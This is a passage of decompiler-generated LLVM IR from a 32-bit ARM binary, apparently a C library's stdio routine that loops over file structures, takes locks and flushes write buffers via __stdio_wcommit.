  %v1_d3d8 = load i32, i32* %r5.global-to-local, align 4
  %v2_d3d8 = add i32 %v1_d3d8, 8
  %v3_d3d8 = inttoptr i32 %v2_d3d8 to i32*
  store i32 %v0_d3d8, i32* %v3_d3d8, align 4
  br label %dec_label_pc_d3dc

dec_label_pc_d3dc:                                ; preds = %dec_label_pc_d380, %bb66
  store i32 168, i32* %r3.global-to-local, align 4
  %v0_d3e0 = load i32, i32* @r6, align 4
  %v2_d3e0 = add i32 %v0_d3e0, 168
  %v3_d3e0 = inttoptr i32 %v2_d3e0 to i32*
  %v4_d3e0 = load i32, i32* %v3_d3e0, align 4
  store i32 %v4_d3e0, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_d3e8 = add i32 %v0_d3e0, 12
  %v3_d3e8 = inttoptr i32 %v2_d3e8 to i32*
  %v4_d3e8 = load i32, i32* %v3_d3e8, align 4
  store i32 %v4_d3e8, i32* %r2.global-to-local, align 4
  %v1_d3ec = add i32 %v4_d3e0, 4
  %v2_d3ec = inttoptr i32 %v1_d3ec to i32*
  %v3_d3ec = load i32, i32* %v2_d3ec, align 4
  store i32 %v3_d3ec, i32* %r1.global-to-local, align 4
  %v1_d3f0 = inttoptr i32 %v4_d3e8 to i32*
  %v2_d3f0 = load i32, i32* %v1_d3f0, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_d3f4 = icmp eq i32 %v3_d3ec, 0
  %v1_d3f8 = add i32 %v2_d3f0, 1
  store i32 %v1_d3f8, i32* %r3.global-to-local, align 4
  store i32 %v1_d3f8, i32* %v1_d3f0, align 4
  br i1 %v2_d3f4, label %dec_label_pc_d404, label %dec_label_pc_d464

dec_label_pc_d404:                                ; preds = %dec_label_pc_d3dc
  %v0_d404 = load i32, i32* %r1.global-to-local, align 4
  %v1_d404 = load i32, i32* %r0.global-to-local, align 4
  %v2_d404 = add i32 %v1_d404, 8
  %v3_d404 = inttoptr i32 %v2_d404 to i32*
  store i32 %v0_d404, i32* %v3_d404, align 4
  %v0_d408 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_d408, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_d40c

dec_label_pc_d40c:                                ; preds = %dec_label_pc_d43c.dec_label_pc_d40c_crit_edge, %dec_label_pc_d404
  %v0_d40c = phi i32 [ %v0_d40c.pre, %dec_label_pc_d43c.dec_label_pc_d40c_crit_edge ], [ %v0_d408, %dec_label_pc_d404 ]
  %v1_d40c = inttoptr i32 %v0_d40c to i32*
  %v2_d40c = load i32, i32* %v1_d40c, align 4
  store i32 %v2_d40c, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_d40c, i32* %r2.global-to-local, align 4
  %v2_d418131 = load i32, i32* %v1_d40c, align 4
  store i32 %v2_d418131, i32* %r3.global-to-local, align 4
  %v3_d41c133 = icmp uge i32 %v2_d418131, %v2_d40c
  store i1 %v3_d41c133, i1* %cpsr_c.global-to-local, align 1
  %v9_d41c139 = icmp eq i32 %v2_d418131, %v2_d40c
  br i1 %v9_d41c139, label %dec_label_pc_d424, label %dec_label_pc_d43c

dec_label_pc_d424:                                ; preds = %dec_label_pc_d40c, %dec_label_pc_d424.dec_label_pc_d418_crit_edge
  %v0_d424140 = phi i32 [ %v1_d41c.pre, %dec_label_pc_d424.dec_label_pc_d418_crit_edge ], [ %v2_d40c, %dec_label_pc_d40c ]
  store i32 %v0_d424140, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_d434 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_d434, label %dec_label_pc_d438, label %dec_label_pc_d424.dec_label_pc_d418_crit_edge

dec_label_pc_d424.dec_label_pc_d418_crit_edge:    ; preds = %dec_label_pc_d424
  %v0_d418.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_d41c.pre = load i32, i32* @r4, align 4
  %v1_d418 = inttoptr i32 %v0_d418.pre to i32*
  %v2_d418 = load i32, i32* %v1_d418, align 4
  store i32 %v2_d418, i32* %r3.global-to-local, align 4
  %v3_d41c = icmp uge i32 %v2_d418, %v1_d41c.pre
  store i1 %v3_d41c, i1* %cpsr_c.global-to-local, align 1
  %v9_d41c = icmp eq i32 %v2_d418, %v1_d41c.pre
  br i1 %v9_d41c, label %dec_label_pc_d424, label %dec_label_pc_d43c

dec_label_pc_d438:                                ; preds = %dec_label_pc_d424
  %v0_d438 = load i32, i32* @r4, align 4
  store i32 %v0_d438, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d43c

dec_label_pc_d43c:                                ; preds = %dec_label_pc_d40c, %dec_label_pc_d424.dec_label_pc_d418_crit_edge, %dec_label_pc_d438
  %v0_d444 = phi i32 [ %v0_d438, %dec_label_pc_d438 ], [ %v2_d418131, %dec_label_pc_d40c ], [ %v2_d418, %dec_label_pc_d424.dec_label_pc_d418_crit_edge ]
  %v1_d43c = phi i32 [ %v0_d438, %dec_label_pc_d438 ], [ %v2_d40c, %dec_label_pc_d40c ], [ %v1_d41c.pre, %dec_label_pc_d424.dec_label_pc_d418_crit_edge ]
  %v3_d43c = icmp uge i32 %v0_d444, %v1_d43c
  store i1 %v3_d43c, i1* %cpsr_c.global-to-local, align 1
  %v9_d43c = icmp eq i32 %v0_d444, %v1_d43c
  br i1 %v9_d43c, label %dec_label_pc_d444, label %dec_label_pc_d43c.dec_label_pc_d40c_crit_edge

dec_label_pc_d43c.dec_label_pc_d40c_crit_edge:    ; preds = %dec_label_pc_d43c
  %v0_d40c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_d40c

dec_label_pc_d444:                                ; preds = %dec_label_pc_d43c
  %v2_d444 = icmp ne i32 %v1_d43c, 0
  store i1 %v2_d444, i1* %cpsr_c.global-to-local, align 1
  %v7_d448 = icmp slt i32 %v1_d43c, 2
  br i1 %v7_d448, label %dec_label_pc_d464, label %dec_label_pc_d44c

dec_label_pc_d44c:                                ; preds = %dec_label_pc_d444
  %v0_d44c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_d44c, i32* %r0.global-to-local, align 4
  %v0_d450 = load i32, i32* %r1.global-to-local, align 4
  %v1_d450 = add i32 %v0_d450, 129
  store i32 %v1_d450, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d464

dec_label_pc_d464:                                ; preds = %dec_label_pc_d3dc, %dec_label_pc_d44c, %dec_label_pc_d444
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_d468 = load i32, i32* @r6, align 4
  %v2_d468 = add i32 %v0_d468, 160
  %v3_d468 = inttoptr i32 %v2_d468 to i32*
  %v4_d468 = load i32, i32* %v3_d468, align 4
  store i32 %v4_d468, i32* %r5.global-to-local, align 4
  %v1_d46c = add i32 %v4_d468, 8
  %v2_d46c = inttoptr i32 %v1_d46c to i32*
  %v3_d46c = load i32, i32* %v2_d46c, align 4
  store i32 %v3_d46c, i32* %r3.global-to-local, align 4
  %v1_d470 = load i32, i32* %r8.global-to-local, align 4
  %v3_d470 = icmp uge i32 %v3_d46c, %v1_d470
  store i1 %v3_d470, i1* %cpsr_c.global-to-local, align 1
  %v9_d470 = icmp eq i32 %v3_d46c, %v1_d470
  br i1 %v9_d470, label %dec_label_pc_d4b8, label %dec_label_pc_d478

dec_label_pc_d478:                                ; preds = %dec_label_pc_d464
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_d468, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_d484123 = inttoptr i32 %v4_d468 to i32*
  %v2_d484124 = load i32, i32* %v1_d484123, align 4
  store i32 %v2_d484124, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_d488126 = icmp eq i32 %v2_d484124, 0
  br i1 %v9_d488126, label %dec_label_pc_d490, label %dec_label_pc_d4a8

dec_label_pc_d490:                                ; preds = %dec_label_pc_d478, %dec_label_pc_d490.dec_label_pc_d484_crit_edge
  %v0_d490127 = phi i32 [ %v1_d488.pre, %dec_label_pc_d490.dec_label_pc_d484_crit_edge ], [ 0, %dec_label_pc_d478 ]
  store i32 %v0_d490127, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_d4a0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_d4a0, label %dec_label_pc_d4a4, label %dec_label_pc_d490.dec_label_pc_d484_crit_edge

dec_label_pc_d490.dec_label_pc_d484_crit_edge:    ; preds = %dec_label_pc_d490
  %v0_d484.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_d488.pre = load i32, i32* @r4, align 4
  %v1_d484 = inttoptr i32 %v0_d484.pre to i32*
  %v2_d484 = load i32, i32* %v1_d484, align 4
  store i32 %v2_d484, i32* %r3.global-to-local, align 4
  %v3_d488 = icmp uge i32 %v2_d484, %v1_d488.pre
  store i1 %v3_d488, i1* %cpsr_c.global-to-local, align 1
  %v9_d488 = icmp eq i32 %v2_d484, %v1_d488.pre
  br i1 %v9_d488, label %dec_label_pc_d490, label %dec_label_pc_d4a8

dec_label_pc_d4a4:                                ; preds = %dec_label_pc_d490
  %v0_d4a4 = load i32, i32* @r4, align 4
  store i32 %v0_d4a4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d4a8

dec_label_pc_d4a8:                                ; preds = %dec_label_pc_d478, %dec_label_pc_d490.dec_label_pc_d484_crit_edge, %dec_label_pc_d4a4
  %v0_d4a8 = phi i32 [ %v0_d4a4, %dec_label_pc_d4a4 ], [ %v2_d484124, %dec_label_pc_d478 ], [ %v2_d484, %dec_label_pc_d490.dec_label_pc_d484_crit_edge ]
  %v1_d4a8 = phi i32 [ %v0_d4a4, %dec_label_pc_d4a4 ], [ 0, %dec_label_pc_d478 ], [ %v1_d488.pre, %dec_label_pc_d490.dec_label_pc_d484_crit_edge ]
  %v3_d4a8 = icmp uge i32 %v0_d4a8, %v1_d4a8
  store i1 %v3_d4a8, i1* %cpsr_c.global-to-local, align 1
  %v9_d4a8 = icmp eq i32 %v0_d4a8, %v1_d4a8
  br i1 %v9_d4a8, label %bb68, label %bb67

bb67:                                             ; preds = %dec_label_pc_d4a8
  %v1_d4ac = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_d4ac, i32* %r0.global-to-local, align 4
  br label %bb68

bb68:                                             ; preds = %dec_label_pc_d4a8, %bb67
  %v1_d4b0 = xor i1 %v9_d4a8, true
  call void @__pseudo_cond_branch(i1 %v1_d4b0, i32 ptrtoint (i32* @global_var_10b94.194 to i32))
  %v0_d4b4 = load i32, i32* %r8.global-to-local, align 4
  %v1_d4b4 = load i32, i32* %r5.global-to-local, align 4
  %v2_d4b4 = add i32 %v1_d4b4, 8
  %v3_d4b4 = inttoptr i32 %v2_d4b4 to i32*
  store i32 %v0_d4b4, i32* %v3_d4b4, align 4
  %v0_d4bc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_d4b8

dec_label_pc_d4b8:                                ; preds = %dec_label_pc_d464, %bb68
  %v0_d4c8 = phi i32 [ %v0_d468, %dec_label_pc_d464 ], [ %v0_d4bc.pre, %bb68 ]
  store i32 160, i32* %r3.global-to-local, align 4
  %v2_d4bc = add i32 %v0_d4c8, 160
  %v3_d4bc = inttoptr i32 %v2_d4bc to i32*
  %v4_d4bc = load i32, i32* %v3_d4bc, align 4
  store i32 %v4_d4bc, i32* %r0.global-to-local, align 4
  store i32 84, i32* %r3.global-to-local, align 4
  %v1_d4c4 = add i32 %v4_d4bc, 4
  %v2_d4c4 = inttoptr i32 %v1_d4c4 to i32*
  %v3_d4c4 = load i32, i32* %v2_d4c4, align 4
  store i32 %v3_d4c4, i32* %r1.global-to-local, align 4
  %v2_d4c8 = add i32 %v0_d4c8, 84
  %v3_d4c8 = inttoptr i32 %v2_d4c8 to i32*
  %v4_d4c8 = load i32, i32* %v3_d4c8, align 4
  store i32 %v4_d4c8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_d4cc = icmp eq i32 %v3_d4c4, 0
  %v1_d4d0 = inttoptr i32 %v4_d4c8 to i32*
  %v2_d4d0 = load i32, i32* %v1_d4d0, align 4
  store i32 %v2_d4d0, i32* @r5, align 4
  br i1 %v2_d4cc, label %dec_label_pc_d4d8, label %dec_label_pc_d538

dec_label_pc_d4d8:                                ; preds = %dec_label_pc_d4b8
  %v2_d4d8 = add i32 %v4_d4bc, 8
  %v3_d4d8 = inttoptr i32 %v2_d4d8 to i32*
  store i32 0, i32* %v3_d4d8, align 4
  %v0_d4dc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_d4dc, i32* @r7, align 4
  br label %dec_label_pc_d4e0

dec_label_pc_d4e0:                                ; preds = %dec_label_pc_d510.dec_label_pc_d4e0_crit_edge, %dec_label_pc_d4d8
  %v0_d4e0 = phi i32 [ %v0_d4e0.pre, %dec_label_pc_d510.dec_label_pc_d4e0_crit_edge ], [ %v0_d4dc, %dec_label_pc_d4d8 ]
  %v1_d4e0 = inttoptr i32 %v0_d4e0 to i32*
  %v2_d4e0 = load i32, i32* %v1_d4e0, align 4
  store i32 %v2_d4e0, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_d4e0, i32* %r2.global-to-local, align 4
  %v2_d4ec111 = load i32, i32* %v1_d4e0, align 4
  store i32 %v2_d4ec111, i32* %r3.global-to-local, align 4
  %v3_d4f0113 = icmp uge i32 %v2_d4ec111, %v2_d4e0
  store i1 %v3_d4f0113, i1* %cpsr_c.global-to-local, align 1
  %v9_d4f0119 = icmp eq i32 %v2_d4ec111, %v2_d4e0
  br i1 %v9_d4f0119, label %dec_label_pc_d4f8, label %dec_label_pc_d510

dec_label_pc_d4f8:                                ; preds = %dec_label_pc_d4e0, %dec_label_pc_d4f8.dec_label_pc_d4ec_crit_edge
  %v0_d4f8120 = phi i32 [ %v1_d4f0.pre, %dec_label_pc_d4f8.dec_label_pc_d4ec_crit_edge ], [ %v2_d4e0, %dec_label_pc_d4e0 ]
  store i32 %v0_d4f8120, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_d508 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_d508, label %dec_label_pc_d50c, label %dec_label_pc_d4f8.dec_label_pc_d4ec_crit_edge

dec_label_pc_d4f8.dec_label_pc_d4ec_crit_edge:    ; preds = %dec_label_pc_d4f8
  %v0_d4ec.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_d4f0.pre = load i32, i32* @r4, align 4
  %v1_d4ec = inttoptr i32 %v0_d4ec.pre to i32*
  %v2_d4ec = load i32, i32* %v1_d4ec, align 4
  store i32 %v2_d4ec, i32* %r3.global-to-local, align 4
  %v3_d4f0 = icmp uge i32 %v2_d4ec, %v1_d4f0.pre
  store i1 %v3_d4f0, i1* %cpsr_c.global-to-local, align 1
  %v9_d4f0 = icmp eq i32 %v2_d4ec, %v1_d4f0.pre
  br i1 %v9_d4f0, label %dec_label_pc_d4f8, label %dec_label_pc_d510

dec_label_pc_d50c:                                ; preds = %dec_label_pc_d4f8
  %v0_d50c = load i32, i32* @r4, align 4
  store i32 %v0_d50c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d510

dec_label_pc_d510:                                ; preds = %dec_label_pc_d4e0, %dec_label_pc_d4f8.dec_label_pc_d4ec_crit_edge, %dec_label_pc_d50c
  %v0_d518 = phi i32 [ %v0_d50c, %dec_label_pc_d50c ], [ %v2_d4ec111, %dec_label_pc_d4e0 ], [ %v2_d4ec, %dec_label_pc_d4f8.dec_label_pc_d4ec_crit_edge ]
  %v1_d510 = phi i32 [ %v0_d50c, %dec_label_pc_d50c ], [ %v2_d4e0, %dec_label_pc_d4e0 ], [ %v1_d4f0.pre, %dec_label_pc_d4f8.dec_label_pc_d4ec_crit_edge ]
  %v3_d510 = icmp uge i32 %v0_d518, %v1_d510
  store i1 %v3_d510, i1* %cpsr_c.global-to-local, align 1
  %v9_d510 = icmp eq i32 %v0_d518, %v1_d510
  br i1 %v9_d510, label %dec_label_pc_d518, label %dec_label_pc_d510.dec_label_pc_d4e0_crit_edge

dec_label_pc_d510.dec_label_pc_d4e0_crit_edge:    ; preds = %dec_label_pc_d510
  %v0_d4e0.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_d4e0

dec_label_pc_d518:                                ; preds = %dec_label_pc_d510
  %v2_d518 = icmp ne i32 %v1_d510, 0
  store i1 %v2_d518, i1* %cpsr_c.global-to-local, align 1
  %v7_d51c = icmp slt i32 %v1_d510, 2
  br i1 %v7_d51c, label %dec_label_pc_d538thread-pre-split, label %dec_label_pc_d520

dec_label_pc_d520:                                ; preds = %dec_label_pc_d518
  %v0_d520 = load i32, i32* @r7, align 4
  store i32 %v0_d520, i32* %r0.global-to-local, align 4
  %v0_d524 = load i32, i32* %r1.global-to-local, align 4
  %v1_d524 = add i32 %v0_d524, 129
  store i32 %v1_d524, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d538thread-pre-split

dec_label_pc_d538thread-pre-split:                ; preds = %dec_label_pc_d518, %dec_label_pc_d520
  %v0_d684.pr.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_d538

dec_label_pc_d538:                                ; preds = %dec_label_pc_d538thread-pre-split, %dec_label_pc_d4b8
  %v0_d684.pr = phi i32 [ %v0_d684.pr.pr, %dec_label_pc_d538thread-pre-split ], [ %v2_d4d0, %dec_label_pc_d4b8 ]
  store i32 100, i32* %sb.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %fp.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_d68418 = icmp eq i32 %v0_d684.pr, 0
  br i1 %v2_d68418, label %dec_label_pc_d68c, label %dec_label_pc_d548

dec_label_pc_d548:                                ; preds = %dec_label_pc_d538, %dec_label_pc_d680
  %v0_d570 = phi i32 [ %v3_d680, %dec_label_pc_d680 ], [ %v0_d684.pr, %dec_label_pc_d538 ]
  %v1_d548 = inttoptr i32 %v0_d570 to i16*
  %v2_d548 = load i16, i16* %v1_d548, align 2
  %v3_d548 = zext i16 %v2_d548 to i32
  store i32 %v3_d548, i32* %r3.global-to-local, align 4
  %v1_d54c = and i32 %v3_d548, 64
  %v2_d54c = icmp eq i32 %v1_d54c, 0
  br i1 %v2_d54c, label %dec_label_pc_d680, label %dec_label_pc_d554

dec_label_pc_d554:                                ; preds = %dec_label_pc_d548
  %v0_d554 = load i32, i32* @r6, align 4
  %v1_d554 = load i32, i32* %sb.global-to-local, align 4
  %v2_d554 = add i32 %v1_d554, %v0_d554
  %v3_d554 = inttoptr i32 %v2_d554 to i32*
  %v4_d554 = load i32, i32* %v3_d554, align 4
  store i32 %v4_d554, i32* %r3.global-to-local, align 4
  %v1_d558 = inttoptr i32 %v4_d554 to i32*
  %v2_d558 = load i32, i32* %v1_d558, align 4
  store i32 %v2_d558, i32* %r3.global-to-local, align 4
  %v2_d55c = icmp ugt i32 %v2_d558, 1
  store i1 %v2_d55c, i1* %cpsr_c.global-to-local, align 1
  %v7_d55c = icmp eq i32 %v2_d558, 2
  br i1 %v7_d55c, label %dec_label_pc_d5c0, label %dec_label_pc_d564

dec_label_pc_d564:                                ; preds = %dec_label_pc_d554
  %v1_d564 = add i32 %v0_d570, 64
  %v2_d564 = inttoptr i32 %v1_d564 to i32*
  %v3_d564 = load i32, i32* %v2_d564, align 4
  store i32 %v3_d564, i32* %r3.global-to-local, align 4
  %v1_d568 = load i32, i32* %r8.global-to-local, align 4
  %v3_d568 = icmp uge i32 %v3_d564, %v1_d568
  store i1 %v3_d568, i1* %cpsr_c.global-to-local, align 1
  %v9_d568 = icmp eq i32 %v3_d564, %v1_d568
  br i1 %v9_d568, label %dec_label_pc_d5b4, label %dec_label_pc_d570

dec_label_pc_d570:                                ; preds = %dec_label_pc_d564
  %v1_d570 = add i32 %v0_d570, 56
  store i32 %v1_d570, i32* @r7, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_d570, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_d58086 = inttoptr i32 %v1_d570 to i32*
  %v2_d58087 = load i32, i32* %v1_d58086, align 4
  store i32 %v2_d58087, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_d58494 = icmp eq i32 %v2_d58087, 0
  br i1 %v9_d58494, label %dec_label_pc_d58c, label %dec_label_pc_d5a4

dec_label_pc_d58c:                                ; preds = %dec_label_pc_d570, %dec_label_pc_d58c.dec_label_pc_d580_crit_edge
  %v0_d58c95 = phi i32 [ %v1_d584.pre, %dec_label_pc_d58c.dec_label_pc_d580_crit_edge ], [ 0, %dec_label_pc_d570 ]
  store i32 %v0_d58c95, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_d59c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_d59c, label %dec_label_pc_d5a0, label %dec_label_pc_d58c.dec_label_pc_d580_crit_edge

dec_label_pc_d58c.dec_label_pc_d580_crit_edge:    ; preds = %dec_label_pc_d58c
  %v0_d580.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_d584.pre = load i32, i32* @r4, align 4
  %v1_d580 = inttoptr i32 %v0_d580.pre to i32*
  %v2_d580 = load i32, i32* %v1_d580, align 4
  store i32 %v2_d580, i32* %r3.global-to-local, align 4
  %v3_d584 = icmp uge i32 %v2_d580, %v1_d584.pre
  store i1 %v3_d584, i1* %cpsr_c.global-to-local, align 1
  %v9_d584 = icmp eq i32 %v2_d580, %v1_d584.pre
  br i1 %v9_d584, label %dec_label_pc_d58c, label %dec_label_pc_d5a4

dec_label_pc_d5a0:                                ; preds = %dec_label_pc_d58c
  %v0_d5a0 = load i32, i32* @r4, align 4
  store i32 %v0_d5a0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d5a4

dec_label_pc_d5a4:                                ; preds = %dec_label_pc_d570, %dec_label_pc_d58c.dec_label_pc_d580_crit_edge, %dec_label_pc_d5a0
  %v0_d5a4 = phi i32 [ %v0_d5a0, %dec_label_pc_d5a0 ], [ %v2_d58087, %dec_label_pc_d570 ], [ %v2_d580, %dec_label_pc_d58c.dec_label_pc_d580_crit_edge ]
  %v1_d5a4 = phi i32 [ %v0_d5a0, %dec_label_pc_d5a0 ], [ 0, %dec_label_pc_d570 ], [ %v1_d584.pre, %dec_label_pc_d58c.dec_label_pc_d580_crit_edge ]
  %v3_d5a4 = icmp uge i32 %v0_d5a4, %v1_d5a4
  store i1 %v3_d5a4, i1* %cpsr_c.global-to-local, align 1
  %v9_d5a4 = icmp eq i32 %v0_d5a4, %v1_d5a4
  br i1 %v9_d5a4, label %bb70, label %bb69

bb69:                                             ; preds = %dec_label_pc_d5a4
  %v1_d5a8 = load i32, i32* @r7, align 4
  store i32 %v1_d5a8, i32* %r0.global-to-local, align 4
  br label %bb70

bb70:                                             ; preds = %dec_label_pc_d5a4, %bb69
  %v1_d5ac = xor i1 %v9_d5a4, true
  call void @__pseudo_cond_branch(i1 %v1_d5ac, i32 ptrtoint (i32* @global_var_10b94.194 to i32))
  %v0_d5b0 = load i32, i32* %r8.global-to-local, align 4
  %v1_d5b0 = load i32, i32* @r5, align 4
  %v2_d5b0 = add i32 %v1_d5b0, 64
  %v3_d5b0 = inttoptr i32 %v2_d5b0 to i32*
  store i32 %v0_d5b0, i32* %v3_d5b0, align 4
  %v0_d5b4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_d5b4

dec_label_pc_d5b4:                                ; preds = %dec_label_pc_d564, %bb70
  %v0_d5b4 = phi i32 [ %v0_d570, %dec_label_pc_d564 ], [ %v0_d5b4.pre, %bb70 ]
  %v1_d5b4 = add i32 %v0_d5b4, 60
  %v2_d5b4 = inttoptr i32 %v1_d5b4 to i32*
  %v3_d5b4 = load i32, i32* %v2_d5b4, align 4
  %v1_d5b8 = add i32 %v3_d5b4, 1
  store i32 %v1_d5b8, i32* %r3.global-to-local, align 4
  store i32 %v1_d5b8, i32* %v2_d5b4, align 4
  %v0_d5c0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_d5c0

dec_label_pc_d5c0:                                ; preds = %dec_label_pc_d554, %dec_label_pc_d5b4
  %v0_d5d8 = phi i32 [ %v0_d570, %dec_label_pc_d554 ], [ %v0_d5c0.pre, %dec_label_pc_d5b4 ]
  %v1_d5c0 = inttoptr i32 %v0_d5d8 to i16*
  %v2_d5c0 = load i16, i16* %v1_d5c0, align 2
  %v3_d5c0 = zext i16 %v2_d5c0 to i32
  store i32 %stack_var_-44.1, i32* %r2.global-to-local, align 4
  %v2_d5c8 = or i32 %v3_d5c0, %stack_var_-44.1
  %v1_d5cc = xor i32 %v2_d5c8, 320
  store i32 %v1_d5cc, i32* %r3.global-to-local, align 4
  %v1_d5d0 = and i32 %v1_d5cc, 832
  %v2_d5d0 = icmp eq i32 %v1_d5d0, 0
  br i1 %v2_d5d0, label %dec_label_pc_d5d8, label %bb71

dec_label_pc_d5d8:                                ; preds = %dec_label_pc_d5c0
  store i32 %v0_d5d8, i32* @r0, align 4
  %v0_d5dc = call i32 @__stdio_wcommit()
  store i32 %v0_d5dc, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_d5e0 = icmp eq i32 %v0_d5dc, 0
  br i1 %v2_d5e0, label %.thread6, label %.thread7

.thread6:                                         ; preds = %dec_label_pc_d5d8
  %v1_d5e4 = load i32, i32* @r5, align 4
  %v2_d5e4 = inttoptr i32 %v1_d5e4 to i16*
  %v3_d5e4 = load i16, i16* %v2_d5e4, align 2
  %v4_d5e4 = zext i16 %v3_d5e4 to i32
  store i32 %v4_d5e4, i32* %r3.global-to-local, align 4
  %v2_d5e8 = add i32 %v1_d5e4, 8
  %v3_d5e8 = inttoptr i32 %v2_d5e8 to i32*
  %v4_d5e8 = load i32, i32* %v3_d5e8, align 4
  store i32 %v4_d5e8, i32* %r2.global-to-local, align 4
  %v2_d5ec = and i32 %v4_d5e4, 65471
  store i32 %v2_d5ec, i32* %r3.global-to-local, align 4
  %v3_d5f0 = add i32 %v1_d5e4, 28
  %v4_d5f0 = inttoptr i32 %v3_d5f0 to i32*
  store i32 %v4_d5e8, i32* %v4_d5f0, align 4
  %v1_d5f4 = load i32, i32* %r3.global-to-local, align 4
  %v2_d5f4 = trunc i32 %v1_d5f4 to i16
  %v3_d5f4 = load i32, i32* @r5, align 4
  %v4_d5f4 = inttoptr i32 %v3_d5f4 to i16*
  store i16 %v2_d5f4, i16* %v4_d5f4, align 2
  br label %bb71

.thread7:                                         ; preds = %dec_label_pc_d5d8
  %v1_d5f8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v1_d5f8, i32* %sl.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %.thread6, %dec_label_pc_d5c0, %.thread7
  %v0_d5fc = load i32, i32* @r6, align 4
  %v1_d5fc = load i32, i32* %sb.global-to-local, align 4
  %v2_d5fc = add i32 %v1_d5fc, %v0_d5fc
  %v3_d5fc = inttoptr i32 %v2_d5fc to i32*
  %v4_d5fc = load i32, i32* %v3_d5fc, align 4
  store i32 %v4_d5fc, i32* %r3.global-to-local, align 4
  %v1_d600 = inttoptr i32 %v4_d5fc to i32*
  %v2_d600 = load i32, i32* %v1_d600, align 4
  store i32 %v2_d600, i32* %r3.global-to-local, align 4
  %v2_d604 = icmp ugt i32 %v2_d600, 1
  store i1 %v2_d604, i1* %cpsr_c.global-to-local, align 1
  %v7_d604 = icmp eq i32 %v2_d600, 2
  br i1 %v7_d604, label %dec_label_pc_d680, label %dec_label_pc_d60c

dec_label_pc_d60c:                                ; preds = %bb71
  %v0_d60c = load i32, i32* @r5, align 4
  %v1_d60c = add i32 %v0_d60c, 60
  %v2_d60c = inttoptr i32 %v1_d60c to i32*
  %v3_d60c = load i32, i32* %v2_d60c, align 4
  %v1_d610 = add i32 %v3_d60c, -1
  store i32 %v1_d610, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_d614 = icmp eq i32 %v1_d610, 0
  store i32 %v1_d610, i32* %v2_d60c, align 4
  br i1 %v2_d614, label %dec_label_pc_d620, label %dec_label_pc_d680

dec_label_pc_d620:                                ; preds = %dec_label_pc_d60c
  %v0_d620 = load i32, i32* %r3.global-to-local, align 4
  %v1_d620 = load i32, i32* @r5, align 4
  %v2_d620 = add i32 %v1_d620, 64
  %v3_d620 = inttoptr i32 %v2_d620 to i32*
  store i32 %v0_d620, i32* %v3_d620, align 4
  %v0_d624 = load i32, i32* @r5, align 4
  %v1_d624 = add i32 %v0_d624, 56
  store i32 %v1_d624, i32* @r7, align 4
  br label %dec_label_pc_d628

dec_label_pc_d628:                                ; preds = %dec_label_pc_d658.dec_label_pc_d628_crit_edge, %dec_label_pc_d620
  %v0_d630 = phi i32 [ %v0_d630.pre, %dec_label_pc_d658.dec_label_pc_d628_crit_edge ], [ %v1_d624, %dec_label_pc_d620 ]
  %v0_d628 = phi i32 [ %v0_d628.pre, %dec_label_pc_d658.dec_label_pc_d628_crit_edge ], [ %v0_d624, %dec_label_pc_d620 ]
  %v1_d628 = add i32 %v0_d628, 56
